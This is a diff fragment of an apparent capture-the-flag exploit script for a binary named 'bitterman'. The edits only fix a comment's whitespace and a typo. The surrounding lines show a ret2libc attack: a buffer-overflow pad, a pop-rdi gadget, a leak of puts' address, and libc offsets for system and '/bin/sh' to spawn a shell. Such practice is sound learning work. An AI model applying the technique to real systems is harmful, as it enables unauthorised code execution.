@@ -14,7 +14,7 @@ puts_plt=p64(0x400520)
 puts_got=p64(0x600c50)
  #R2 BITTERMAN; /R rdi
  # 0x00400853                 5f  pop rdi                                      
-  # 0x00400854                 c3  ret  
+ # 0x00400854                 c3  ret  
 pop_rdi=p64(0x400853)
 #gdb bitterman pattern create 1000 ; pattern offset at the value of sigev
 junk="A"*152
@@ -33,7 +33,7 @@ log.success("Leaked Address (Puts) : "+ str(leak))
 leak = u64(leak)#unpack the leak address
 
 #leak = struct.unpack('Q', leak)[0] ;becomes handy if the above u64 didn't works 
-# the hard part, The stategey is to first get the address where the libc sits in the memory and in the binary and then subtract those thow memory to get the actual offset of the binary, so every time the binary runs it will make new offsets and new offset + memory of the main,system,and /bin/sh gives us the actual address of the main , sysystem,/bin/sh ;) 
+# the hard part, The stategey is to first get the address where the libc sits in the memory and in the binary and then subtract those thow memory to get the actual offset of the binary, so every time the binary runs it will make new offsets and new offset + memory of the main,system,and /bin/sh gives us the actual address of the main , system,/bin/sh ;) 
 put_libc = 0x74040
 system_libc = 0x46ff0
 binsh = 0x183cee
